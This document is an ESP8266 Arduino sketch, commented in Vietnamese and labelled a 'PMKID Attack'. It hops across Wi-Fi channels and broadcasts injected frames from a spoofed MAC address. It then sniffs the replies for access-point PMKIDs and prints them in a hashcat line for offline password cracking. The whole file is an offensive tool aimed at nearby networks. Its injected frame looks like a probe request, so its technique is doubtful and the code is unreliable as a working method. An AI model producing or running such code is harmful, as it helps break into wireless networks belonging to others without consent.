#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

#define SERIAL_BAUD       115200

// Danh sách channel hop 2.4GHz
const uint8_t channels[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
const int num_channels = sizeof(channels) / sizeof(channels[0]);
int current_channel_index = 0;

// Packet broadcast (Receiver và BSSID đều FF:FF:FF:FF:FF:FF)
uint8_t pmkid_packet[] = {
  0x40, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Receiver: Broadcast
  0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,   // Transmitter fake
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // BSSID: Broadcast
  0x00, 0x00,
  0x31, 0x04,
  0x01, 0x00,
  0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
  0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
  0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static void ICACHE_FLASH_ATTR on_packet_received(uint8_t *buf, uint16_t len) {
  if (len < 60) return;

  // Lấy MAC AP từ packet (thường addr3 hoặc addr2)
  uint8_t ap_mac[6];
  memcpy(ap_mac, &buf[16], 6);  // Addr3 thường là BSSID

  for (uint16_t i = 0; i < len - 25; i++) {
    if (buf[i] == 0xDD && buf[i+1] >= 20 && buf[i+4] == 0x00 && buf[i+5] == 0x90 && buf[i+6] == 0x4C && buf[i+7] == 0x04) {
      Serial.println("\n!!! TIM THAY PMKID !!!");
      Serial.printf("Channel: %d | Tu AP MAC: ", wifi_get_channel());
      for (int k = 0; k < 6; k++) {
        if (ap_mac[k] < 16) Serial.print("0");
        Serial.print(ap_mac[k], HEX);
        Serial.print(k < 5 ? ":" : "\n");
      }
      Serial.print("PMKID hex: ");
      for (int j = 0; j < 16; j++) {
        uint8_t b = buf[i + 8 + j];
        if (b < 16) Serial.print("0");
        Serial.print(b, HEX);
        Serial.print(" ");
      }
      Serial.println("\nCopy va tao hashcat: WPA*01*[PMKID]*[AP_MAC_hex]*DEADBEEF0001*[SSID_HEX]*");
      return;
    }
  }
}

void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(1000);

  Serial.println("\nESP8266 PMKID Attack - Broadcast (khong co dinh MAC) + Hop Channel");
  Serial.println("Gui request den tat ca AP xung quanh...");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  wifi_promiscuous_enable(0);
  delay(500);

  wifi_set_promiscuous_rx_cb(on_packet_received);
  wifi_promiscuous_enable(1);
  Serial.println("Da bat sniff va hop channel...");
}

void loop() {
  current_channel_index = (current_channel_index + 1) % num_channels;
  uint8_t ch = channels[current_channel_index];
  wifi_set_channel(ch);
  Serial.printf("Hop sang channel %d\n", ch);

  send_pmkid_request();

  delay(600);  // Thời gian mỗi channel
}

void send_pmkid_request() {
  wifi_promiscuous_enable(0);

  int result = wifi_send_pkt_freedom(pmkid_packet, sizeof(pmkid_packet), 0);

  if (result == 0) {
    Serial.printf("Gui broadcast thanh cong tren channel %d!\n", wifi_get_channel());
  } else {
    Serial.printf("Gui that bai (code %d) tren channel %d\n", result, wifi_get_channel());
  }

  wifi_promiscuous_enable(1);
}
